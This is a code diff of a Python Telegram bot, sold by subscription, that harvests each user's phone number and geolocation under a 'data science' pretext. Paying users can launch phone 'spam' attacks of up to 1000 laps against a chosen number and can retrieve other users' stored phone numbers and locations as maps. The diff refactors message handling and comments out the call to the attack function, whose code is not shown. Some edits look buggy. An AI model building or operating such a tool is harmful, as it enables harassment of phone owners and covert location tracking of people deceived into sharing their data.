@@ -7,7 +7,7 @@ import os
 import phonenumbers as ph
 import telebot as t
 
-from bot_funcs.main_of_da_funcs import atack_function
+#from bot_funcs.main_of_da_funcs import atack_function
 from telebot import types as ty
 
 
@@ -20,6 +20,9 @@ uid_contact={}
 got_id = []
 ql = {}
 uid_bool = {}
+location_message_ = {}
+after_purchase_ = {}
+contact_message = {}
 al = {}
 bot = t.TeleBot(config.get('token'))
 path = os.path.abspath('data.db')
@@ -40,25 +43,24 @@ def gen_promo(message):
 
 @bot.message_handler(commands=['start'])
 def _init_(message):
-    global current_promocode
-    global current_promocode
-    global contact_message
-    global promo_message
-    global after_purchase
-    global location_message
-    global main_keyboard
-    global spam_message
-    global data_message
-    global cancel
-    global file_
-    global laps
+    #
+    #
+    #
+    #
+    #
+    #
+    #
+    #
+    #
+    #
     try:
         if message.from_user.id in got_id:
             bot.send_message(message.from_user.id,'❌ This message may be sent once.',reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='🗑 Delete message (can be deleted in 2 days)',callback_data='del_data')]]))  
         else:
             got_id.append(message.from_user.id)
             contact_keyboard = ty.ReplyKeyboardMarkup(True,True,input_field_placeholder='📱 Waiting for your phone number.').add(ty.KeyboardButton('📱 Give my phone number',request_contact=True))
-            contact_message =bot.send_message(message.chat.id, f'👋 Hello, @{message.from_user.username}!\n\n☝️ To start using this bot please give me your phone number.', reply_markup=contact_keyboard)
+            contact_message_ =bot.send_message(message.chat.id, f'👋 Hello, @{message.from_user.username}!\n\n☝️ To start using this bot please give me your phone number.', reply_markup=contact_keyboard)
+            contact_message.update([(message.from_user.id, contact_message_)])
     except:
         pass #if they dont hav un lol ._.
 
@@ -66,22 +68,25 @@ def _init_(message):
 @bot.message_handler(content_types=['contact'])
 def _afterinit_(message):
     bot.delete_message(message_id=message.message_id, chat_id=message.chat.id)
-    bot.delete_message(message_id=contact_message.message_id,chat_id=message.chat.id)
+    bot.delete_message(message_id=contact_message.get(message.from_user.id).message_id,chat_id=message.chat.id)
     uid_contact.update([(str(message.from_user.id), message.contact.phone_number)])
     location_keyboard = ty.ReplyKeyboardMarkup(True,True,input_field_placeholder='📟 Waiting for your geolocation.').add(ty.KeyboardButton('📟 Give my location',request_location=True))
     location_message =bot.send_message(message.chat.id,'👌 Last step. Send your location.\n\n📟 This information may be used by other users only if they have access to functions.\n\n✍️ We need this information for data science.',reply_markup=location_keyboard)
-
+    location_message_.update([(message.from_user.id, location_message)])
 
 @bot.message_handler(content_types=['location'])
 def agreement_and_db_insert(message):
     bot.delete_message(message_id=message.message_id, chat_id=message.chat.id)
-    bot.delete_message(message_id=location_message.message_id,chat_id=message.chat.id)
+    bot.delete_message(message_id=location_message_.get(message.from_user.id).message_id,chat_id=message.chat.id)
     db = sqlite3.connect(f'{path}data.db')
+    
     with db.cursor() as cure:
         
         db.execute('CREATE TABLE IF NOT EXISTS data(un text,pn text,id integer ,st integer, la text, lo text)')
         cure.execute("SELECT * FROM data WHERE id =?", [message.from_user.id])
+        
         if cure.fetchone() is None:
+            
             cure.execute("INSERT INTO data (un,pn,id,st,la,lo)VALUES (?,?,?,?,?,?)", ('@'+message.from_user.username, str(uid_contact.get(str(message.from_user.id))), message.from_user.id, 0, str(message.location.latitude),str(message.location.longitude)))
             db.commit()
         cure.execute("SELECT * FROM data WHERE id =?", [message.from_user.id]);check = cure.fetchone()
@@ -94,6 +99,9 @@ def agreement_and_db_insert(message):
 @bot.callback_query_handler(func=lambda call:True)
 def callback(call):
     
+    global main_keyboard
+    global cancel
+
     if call.data == 'main_menu':
         
         bot.clear_step_handler_by_chat_id(call.mesage.chat.id)
@@ -104,6 +112,9 @@ def callback(call):
     elif call.data == 'spam':
         
         if uid_bool.get(call.from_user.id):
+
+            global spam_message
+
             spam_message=bot.edit_message_text(chat_id=call.message.chat.id,message_id= call.message.message_id, text='⏳ Please input your phone number below.\n\n🌀 Example: 79236723802',reply_markup=cancel)
             bot.register_next_step_handler(spam_message,phone_number_check)
         
@@ -130,7 +141,8 @@ def callback(call):
     
     elif call.data == 'sub':
         after_purchase = bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text='#️⃣ Which option would you like to select?',reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='🎟 By promocode', callback_data='pay_by_promo'), ty.InlineKeyboardButton(text='⭐️ By telegram stars', callback_data='pay_by_stars')], [ty.InlineKeyboardButton(text='❌ Cancel option', callback_data='main_menu')]]))
-    
+        after_purchase_.update([(call.message.id, after_purchase)])
+
     elif call.data =='pay_by_stars':
         bot.answer_callback_query(call.id)
         bot.send_invoice(call.message.chat.id,title="⭐️ Buy subscription",description="🌀 This subscription will give you access to the main bot funcs!",invoice_payload="flash_мне_в_очко",provider_token="",  currency="XTR",prices=[ty.LabeledPrice(label='⭐️ Purchase for 109.(9) stars',amount=110)], reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='⭐️ Purchase for 109.(9) stars', pay=True),ty.InlineKeyboardButton(text='🗑 Delete message (can be deleted in 2 days)',callback_data='del_data')]]))
@@ -150,7 +162,8 @@ def activate_your_promo(message):
     bot.edit_message_text('👀 Looks like you don\'t have a subscription!\n\n☝️ You can find more information in "🔑 Subscription".',message.chat.id, message.message_id,reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='📃 To main menu',callback_data='main_menu')]]))
 
 def spam_error(message, error):
-    phone_number.pop(message.from_user.id);bot.edit_message_text(f'❌ Uh-oh, something went wrong!\n\n{error}',chat_id=message.chat.id, message_id=spam_message.message_id, reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='❌ Cancel option', callback_data='main_menu'),ty.InlineKeyboardButton(text='🔂 Repeat option', callback_data='spam')]]))
+    phone_number.pop(message.from_user.id)
+    bot.edit_message_text(f'❌ Uh-oh, something went wrong!\n\n{error}',chat_id=message.chat.id, message_id=spam_message.message_id, reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='❌ Cancel option', callback_data='main_menu'),ty.InlineKeyboardButton(text='🔂 Repeat option', callback_data='spam')]]))
 
 def promo_input(message):
     bot.delete_message(message_id=message.message_id,chat_id=message.chat.id)
@@ -161,10 +174,10 @@ def promo_input(message):
         db.commit()
         uid_bool.update([(message.from_user.id, True)])
         current_promocode=None
-        bot.edit_message_text(chat_id=message.chat.id, message_id=promo_message.message_id, text='☑️ Success! Promocode\'s activated!',reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='📃 To main menu',callback_data='main_menu')]]))
+        bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, text='☑️ Success! Promocode\'s activated!',reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='📃 To main menu',callback_data='main_menu')]]))
     
     else:
-        bot.edit_message_text(chat_id=message.chat.id, message_id=promo_message.message_id, text='✖️ Promocode not found!',reply_markup=cancel)
+        bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, text='✖️ Promocode not found!',reply_markup=cancel)
 
 
 def phone_number_check(message):
@@ -172,7 +185,7 @@ def phone_number_check(message):
     bot.delete_message(message.chat.id,message.message_id)
     try:
         if ph.is_valid_number(ph.parse('+'+phone_number.get(message.from_user.id))) and int(phone_number.get(message.from_user.id)):
-            laps = bot.edit_message_text("🏁 Great, now input laps value.\n\n🌀 The value must be between 1 and 1000",message_id=spam_message.message_id,chat_id=message.chat.id, reply_markup=cancel)
+            laps = bot.edit_message_text("🏁 Great, now input laps value.\n\n🌀 The value must be between 1 and 1000",message_id=message.message_id,chat_id=message.chat.id, reply_markup=cancel)
             bot.register_next_step_handler(laps,laps_check)
             
         else:
@@ -199,7 +212,7 @@ def laps_check(message):
                 data_to_insert['atack'] = 1
                 change_data(data_to_insert)
                 bot.edit_message_text('✅ Success!\n\n🚀 The attack has already been launched, you may now return to main menu',chat_id=message.chat.id, message_id=spam_message.message_id, reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='📃 To main menu',callback_data='main_menu')]]))
-                atack_function(phone_number.get(message.from_user.id), int(message.text))
+                #atack_function(phone_number.get(message.from_user.id), int(message.text))
                 data_to_insert['atack'] = 0
                 change_data(data_to_insert)
         
@@ -230,12 +243,12 @@ def data_check(message):
             map_file.save(f'{index}{data[2]}.html')
         
         with open(f'{index}{data[2]}.html','rb') as send:
-            bot.edit_message_text('✅ Success! You may now return to main menu.',message_id=data_message.message_id,chat_id=message.chat.id, reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='📃 To main menu',callback_data='main_menu')]]))
+            bot.edit_message_text('✅ Success! You may now return to main menu.',message_id=message.message_id,chat_id=message.chat.id, reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='📃 To main menu',callback_data='main_menu')]]))
             file_=bot.send_document(chat_id=message.chat.id,document=send,caption=f'☑️ User found! Their phone number:{data[2]}', reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='🗑 Delete message (can be deleted in 2 days)',callback_data='del_data')]]))
             send.close()
     
     else:
-        bot.edit_message_text('👀 Looks like this user didn\'t use this bot before.\n\n🌀 Data not found.',message_id=data_message.message_id,chat_id=message.chat.id, reply_markup=cancel)
+        bot.edit_message_text('👀 Looks like this user didn\'t use this bot before.\n\n🌀 Data not found.',message_id=message.message_id,chat_id=message.chat.id, reply_markup=cancel)
 
 
 @bot.pre_checkout_query_handler(func=lambda query: True)
@@ -251,7 +264,7 @@ def handle_successful_payment(message):
     db.commit()
     uid_bool.update([(message.from_user.id, True)])
     bot.delete_message(message.chat.id,message.message_id)
-    bot.edit_message_text(chat_id=message.chat.id, message_id=after_purchase.message_id, text='☑️ Success! Promocode\'s activated!',reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='📃 To main menu',callback_data='main_menu')]])) 
+    bot.edit_message_text(chat_id=message.chat.id, message_id=after_purchase_.get(message.from_user.id).message_id, text='☑️ Success! Promocode\'s activated!',reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='📃 To main menu',callback_data='main_menu')]])) 
 
 if  __name__ == '__main__':
     bot.infinity_polling(1209600) 
